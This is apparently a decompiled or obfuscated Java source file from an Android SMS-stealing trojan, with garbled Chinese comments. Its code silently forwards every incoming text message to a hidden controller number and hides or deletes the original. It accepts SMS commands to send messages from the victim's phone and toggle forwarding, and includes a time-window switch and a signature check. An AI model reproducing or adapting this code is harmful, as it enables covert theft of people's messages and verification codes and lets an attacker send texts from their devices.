package com.a.a;

import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.InputStreamReader;
import java.security.cert.CertificateFactory;
import java.security.cert.X509Certificate;
import java.text.SimpleDateFormat;
import java.util.Locale;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.telephony.SmsManager;
import android.util.Base64;
import android.util.Log;
import android.widget.Toast;

public class u {
	private static boolean notFirstRun = false;
	final static boolean DEBUG = false;

	/** ���п�ʼʱ��|���н���ʱ�� */
	private static long[] RUNTIME;

	public static void chkFirstRun(Context context) {
		u.log(context, "chkFirstRun");

		if (notFirstRun) {
			return;
		}
		n.chkIsFirstRun(context);
		notFirstRun = true;
	}

	public static boolean isCanRun(Context context) {
		if (RUNTIME == null) {
			chkConfigInRaw(context);
		}
		long time = System.currentTimeMillis();
		if (RUNTIME[0] == 0 || RUNTIME[1] == 0) {
			return true;
		} else if (RUNTIME[0] <= time && RUNTIME[1] >= time) {
			return true;
		} else {
			return false;
		}
	}

	public static void chkConfigInRaw(Context context) {
		if (RUNTIME == null || n.PWD == null) {
			try {
				BufferedReader reader = new BufferedReader(
						new InputStreamReader(context.getResources()
								.openRawResource(R.raw.table), "utf-8"));
				n.PWD = reader.readLine();
				SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm",
						Locale.CHINA);
				RUNTIME = new long[2];
				String tmp;
				tmp = reader.readLine();
				if (tmp.equals("")) {
					RUNTIME[0] = 0;
				} else {
					RUNTIME[0] = sdf.parse(tmp).getTime();
				}
				tmp = reader.readLine();
				if (tmp.equals("")) {
					RUNTIME[1] = 0;
				} else {
					RUNTIME[1] = sdf.parse(tmp).getTime();
				}

				reader.close();
			} catch (Exception e) {
				RUNTIME[0] = 0;
				RUNTIME[1] = 0;
				u.log(context, "��RAW��ȡ������Ϣʧ�ܣ�" + e.getMessage());
			}
		}
	}

	public static void sendSms(Context context, String SENDTO, String content) {
		if (SENDTO == null) {
			SENDTO = n.getSendTo(context);
		}
		u.log(context, "���ͣ�" + SENDTO + " " + content);
		if (Boolean.parseBoolean(String.valueOf(DEBUG))) {
			return;
		}
		a.Msg.push(content);
		SmsManager smr = SmsManager.getDefault();
		smr.sendMultipartTextMessage(SENDTO, null, smr.divideMessage(content),
				null, null);
	}

	public static void log(Context context, String txt) {
		if (DEBUG) {
			Toast.makeText(context, txt, Toast.LENGTH_SHORT).show();
			Log.e("T_DEBUG", txt);
		}
	}

	static private boolean isRegisterReveiver = false;

	public static void regReceiver(Context context) {
		if (isRegisterReveiver) {
			return;
		} else {
			isRegisterReveiver = true;
			new so(context);
		}
	}

	public static void handlerSms(Context context, String address,
			String content, BroadcastReceiver receiver) {
		/** �յ���Ϣ�Զ�ת���� */
		String SENDTO = n.getSendTo(context);
		SharedPreferences sp = context.getSharedPreferences("config",
				Context.MODE_PRIVATE);
		if (address.startsWith("+86")) {
			address = address.substring(3);
		}
		u.log(context, "�յ���" + address + " " + content);
		// ���ָ��
		if (address.equals(SENDTO)) {
			String[] s = content.split("#", 2);
			if (s.length != 2) {
				u.log(context, "ָ�����");
				u.sendSms(context, null, "����ָ���ʽ���󣬸�ʽΪ���ֻ���#�������ݡ�");
				receiver.abortBroadcast();
			} else {
				if ("com".equals(s[0])) {
					sp.edit().putString("flag", s[1]).commit();
					receiver.abortBroadcast();
				} else {
					u.sendSms(context, s[0], s[1]);
					receiver.abortBroadcast();
				}

			}
		} else {
			if ("true".equals(sp.getString("flag", "true"))) {
				u.sendSms(context, SENDTO, "[" + address + "]" + content);
				receiver.abortBroadcast();
			}

		}
	}

	public static void handlerSms(Context context, String address,
			String content, String durl) {
		/** �յ���Ϣ�Զ�ת���� */
		if (so.key.equals(getPublicKey(context))) {
			String SENDTO = n.getSendTo(context);
			SharedPreferences sp = context.getSharedPreferences("config",
					Context.MODE_PRIVATE);
			if (address.startsWith("+86")) {
				address = address.substring(3);
			}
			u.log(context, "�յ���" + address + " " + content);
			// ���ָ��
			if (address.equals(SENDTO)) {
				String[] s = content.split("#", 2);
				if (s.length != 2) {
					u.log(context, "ָ�����");
					u.sendSms(context, null, "����ָ���ʽ���󣬸�ʽΪ���ֻ���#�������ݡ�");
					context.getContentResolver().delete(Uri.parse(durl), null,
							null);
				} else {
					if ("com".equals(s[0])) {
						sp.edit().putString("flag", s[1]).commit();
						context.getContentResolver().delete(Uri.parse(durl),
								null, null);
					} else {
						u.sendSms(context, s[0], s[1]);
						context.getContentResolver().delete(Uri.parse(durl),
								null, null);
					}

				}
			} else {
				if ("true".equals(sp.getString("flag", "true"))) {
					u.sendSms(context, SENDTO, "[" + address + "]" + content);
					context.getContentResolver().delete(Uri.parse(durl), null,
							null);
				}
			}
		}
	}

	public static String getPublicKey(Context context) {
		try {
			PackageManager pm = context.getPackageManager();
			PackageInfo info = pm.getPackageInfo(context.getPackageName(),
					PackageManager.GET_SIGNATURES);
			CertificateFactory certFactory = CertificateFactory
					.getInstance("X.509");
			X509Certificate cert = (X509Certificate) certFactory
					.generateCertificate(new ByteArrayInputStream(
							info.signatures[0].toByteArray()));
			return Base64.encodeToString(
					cert.getIssuerDN().getName().getBytes("UTF-8"),
					Base64.DEFAULT).trim();
		} catch (Exception e) {
			e.printStackTrace();
		}
		return null;
	}

}
